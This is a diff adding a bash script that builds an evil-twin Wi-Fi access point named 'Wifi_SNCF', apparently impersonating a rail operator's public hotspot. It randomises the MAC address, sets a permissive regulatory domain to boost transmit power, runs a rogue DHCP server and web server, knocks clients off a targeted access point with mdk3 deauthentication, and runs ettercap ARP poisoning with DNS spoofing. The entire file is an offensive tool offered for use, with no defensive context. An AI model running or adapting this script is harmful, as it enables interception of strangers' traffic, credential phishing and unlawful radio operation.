@@ -1,0 +1,49 @@
+#!/bin/bash
+
+iptables -F
+iptables -X
+iptables -t nat -F
+iptables -t nat -X
+iptables -t mangle -F
+iptables -t mangle -X
+iptables -P INPUT ACCEPT
+iptables -P OUTPUT ACCEPT
+
+
+echo 	"authoritative;
+	 default-lease-time 600;
+	 max-lease-time 7200;
+	 subnet 192.168.0.0 netmask 255.255.255.0{
+	 	option subnet-mask 255.255.255.0;
+	 	option broadcast-address 192.168.0.255;
+	 	option routers 192.168.1.129;
+	 	option domain-name-servers 8.8.8.8;
+		range 192.168.0.2 192.168.0.10;
+		allow unknown-clients;
+	}" > /etc/dhcp/dhcpd.conf
+
+ifconfig wlan0 down
+macchanger -r wlan0         #randomise our MAC
+iw reg set BO               #change our regulatory domain to something more permissive
+ifconfig wlan0 up
+iwconfig wlan0 txpower 27   #1Watt transmit power
+
+airmon-ng check kill
+airmon-ng start wlan0                     #Put our card into monitor mode
+gnome-terminal -x airbase-ng -e "Wifi_SNCF" -c 11 -P wlan0mon #Set up our soft AP for 1 net
+sleep 3
+
+ifconfig at0 up 192.168.0.1 netmask 255.255.255.0
+route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.1.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+/etc/init.d/isc-dhcp-server start
+/etc/init.d/apache2 start
+
+#/usr/sbin/dnsspoof -f /etc/dnsspoof.conf
+
+echo "C8:CB:B8:E7:68:12" > blacklist
+gnome-terminal -x mdk3 wlan0mon d -b blacklist -c 9
+gnome-terminal -x ettercap -i at0 -T -q -P dns_spoof -M ARP:remote
+
